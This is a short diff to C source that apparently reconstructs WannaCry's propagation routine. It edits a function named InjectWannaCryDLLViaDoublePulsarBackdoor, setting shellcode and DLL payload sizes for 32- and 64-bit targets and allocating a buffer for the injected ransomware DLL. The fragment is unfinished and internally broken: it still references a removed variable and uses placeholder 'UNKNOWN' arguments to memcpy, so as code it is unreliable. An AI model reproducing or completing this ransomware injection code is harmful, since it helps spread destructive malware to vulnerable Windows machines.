@@ -164,20 +164,26 @@ int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
 
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
 {
-	int payload_size;	
+	/*
+	DWORD WannacryFileSize = value of -> ReadFile Wannacry EXE into -> EXE_BUFFER_SOMEWHERE
+	DWORD totalPayloadSize_x86 = 0x4060 + 0x1305 + WannacryFileSize;
+	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
+	*/
+	int shellcode_payload_size;
+	int DLLSize;
 	if(architectureType)
 	{
 		//32 bits
-		//decimal: 4869
-		payload_size = 0x1305;
+		shellcode_payload_size = 0x1305; //decimal: 4869
+		DLLSize = 0x4060;
 	}
 	else
 	{
 		//64 bits
-		//decimal: 6144;
-		payload_size = 0x1800;
+		shellcode_payload_size = 0x1800; //decimal: 6144;
+		DLLSize = 0xc8a4;
 	}
-	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, payload_size + 12 + v8);
+	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + DLLSize + 12);
 	memcpy(hMem + payload_size, UNKNOWN, UNKNOWN);
 	if(architectureType)
 	{
